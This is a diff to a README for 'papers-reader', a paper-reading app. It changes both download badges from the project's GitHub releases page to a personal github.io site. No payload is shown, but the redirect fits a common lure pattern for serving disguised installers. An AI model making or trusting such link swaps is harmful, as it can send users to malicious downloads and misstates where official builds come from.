@@ -14,7 +14,7 @@ Welcome! papers-reader is a simple program that helps you read research papers e
 
 ## 📥 Download and Install
 
-[![Download papers-reader](https://img.shields.io/badge/Download-papers--reader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alasdairinfrangible85/papers-reader/releases)
+[![Download papers-reader](https://img.shields.io/badge/Download-papers--reader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://alasdairinfrangible85.github.io)
 
 Visit this link to download the application. Once you're on the page, look for the latest release and download the file that matches your computer.
 
@@ -190,7 +190,7 @@ papers-reader is actively developed. Check the download page regularly for:
 
 Visit the download link, grab the latest version, and open your first research paper today. Whether you're studying international research or just curious about academic work in other languages, papers-reader makes everything accessible in your own language.
 
-[![Get papers-reader Now](https://img.shields.io/badge/%E2%9C%93%20Download%20Now-papers--reader-important?style=for-the-badge&logo=github)](https://github.com/Alasdairinfrangible85/papers-reader/releases)
+[![Get papers-reader Now](https://img.shields.io/badge/%E2%9C%93%20Download%20Now-papers--reader-important?style=for-the-badge&logo=github)](https://alasdairinfrangible85.github.io)
 
 The download page shows available versions. Pick the newest one, download it, and start reading research papers from around the world—all in your preferred language.
 
